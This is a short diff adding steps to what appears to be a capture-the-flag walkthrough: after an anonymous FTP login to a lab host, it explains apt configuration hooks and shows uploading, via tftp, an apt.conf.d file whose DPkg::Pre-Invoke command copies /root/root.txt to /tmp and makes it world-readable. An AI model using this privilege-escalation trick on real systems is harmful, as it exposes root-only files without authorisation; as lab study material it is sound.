@@ -277,4 +277,13 @@ Address                  HWtype  HWaddress           Flags Mask            Iface
 
 ftp 192.168.0.1 anonymous
 
+You can configure the apt-get command using /etc/apt/apt.conf file 
+or place configuration in a special directory at /etc/apt/apt.conf.d/.
+The following two options allows you to run shell commands or script before/after invoking dpkg/apt-get tools:
 
+upload file to /etc/apt/apt.conf with tftp
+
+DPkg::Pre-Invoke {"cat /root/root.txt > /tmp/root.txt | chmod 777 /tmp/root.txt" };
+
+tftp 192.168.0.1
+put 10update /etc/apt/apt.conf.d/10update 
